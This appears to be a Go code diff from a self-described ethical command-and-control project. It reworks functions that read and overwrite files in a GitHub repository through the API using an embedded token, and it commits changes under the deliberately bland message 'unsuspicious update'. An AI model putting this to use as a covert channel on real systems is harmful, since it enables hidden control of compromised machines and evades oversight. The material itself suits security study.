@@ -3,10 +3,11 @@ package github
 import (
 	"bytes"
 	"crypto/sha1"
+	"encoding/base64"
 	"encoding/json"
 	"fmt"
-	"io"
 	"net/http"
+	"strings"
 )
 
 var GithubToken string // to be assigned at compile time using ldflags
@@ -14,37 +15,53 @@ const repoOwner = "SurainSaigal"
 const repoName = "c2-project-ethical"
 
 // Fetches file from github and returns as string
-func ReadFile(url string) (string, error) {
-	resp, err := http.Get(url)
+func ReadFile(filePath string) (string, error) {
+	apiUrl := fmt.Sprintf("https://api.github.com/repos/%s/%s/contents/%s", repoOwner, repoName, filePath)
+
+	req, _ := http.NewRequest("GET", apiUrl, nil)
+	req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", GithubToken))
+	req.Header.Set("Accept", "application/vnd.github+json")
+
+	resp, err := http.DefaultClient.Do(req)
 	if err != nil {
-		fmt.Println("Error fetching file:", err)
 		return "", err
 	}
 	defer resp.Body.Close()
 
 	if resp.StatusCode != http.StatusOK {
-		fmt.Println("Failed to fetch file. Status:", resp.Status)
-		return "", fmt.Errorf("failed to fetch file: %s", resp.Status)
+		return "", fmt.Errorf("API error: %s", resp.Status)
 	}
 
-	body, err := io.ReadAll(resp.Body)
-	if err != nil {
-		fmt.Println("Error reading response:", err)
+	var result struct {
+		Content string `json:"content"`
+	}
+	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
 		return "", err
 	}
 
-	return string(body), nil
+	// clean github response
+	cleanedContent := strings.ReplaceAll(result.Content, "\n", "")
+	decodedBytes, err := base64.StdEncoding.DecodeString(cleanedContent)
+	if err != nil {
+		return "", err
+	}
+
+	return string(decodedBytes), nil
 }
 
 // Overwrites a file on github by creating a commit through github api
 func WriteFile(filePath string, prevContent string, newContent string) error {
 	apiUrl := fmt.Sprintf("https://api.github.com/repos/%s/%s/contents/%s", repoOwner, repoName, filePath)
+
+	encodedContent := base64.StdEncoding.EncodeToString([]byte(newContent))
 	payload := map[string]string{
 		"message": "unsuspicious update",
-		"content": newContent,
+		"content": encodedContent,
 		"sha":     calculateGitSHA(prevContent),
 	}
 	jsonData, _ := json.Marshal(payload)
+
+	fmt.Println("json payload: ", string(jsonData))
 
 	req, _ := http.NewRequest("PUT", apiUrl, bytes.NewBuffer(jsonData))
 	req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", GithubToken))
@@ -55,6 +72,10 @@ func WriteFile(filePath string, prevContent string, newContent string) error {
 		return err
 	}
 	defer updateResp.Body.Close()
+
+	fmt.Println("sent request!")
+
+	fmt.Println("full response: ", updateResp)
 
 	if updateResp.StatusCode != http.StatusOK && updateResp.StatusCode != http.StatusCreated {
 		return fmt.Errorf("failed to update: %s", updateResp.Status)
